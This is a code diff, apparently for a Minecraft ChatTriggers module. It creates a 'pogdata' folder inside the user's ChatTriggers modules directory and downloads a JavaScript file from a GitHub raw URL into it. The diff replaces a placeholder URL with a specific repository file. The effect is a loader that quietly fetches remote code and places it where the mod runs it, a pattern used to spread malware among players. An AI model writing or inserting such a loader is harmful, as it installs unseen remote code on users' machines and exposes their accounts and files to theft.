@@ -10,11 +10,11 @@ const appData = System.getenv("APPDATA");
 const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/pogdata");
 targetPath.mkdirs(); // Create folders if needed
 
-// Define destination file (you can change the filename)
+// Destination file
 const file = new File(targetPath, "script.js");
 
-// GitHub-hosted JavaScript file URL (raw content)
-const url = "https://raw.githubusercontent.com/your-username/your-repo/main/script.js";
+// GitHub raw file URL
+const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b";
 
 request(url).then(response => {
   const fw = new FileWriter(file);
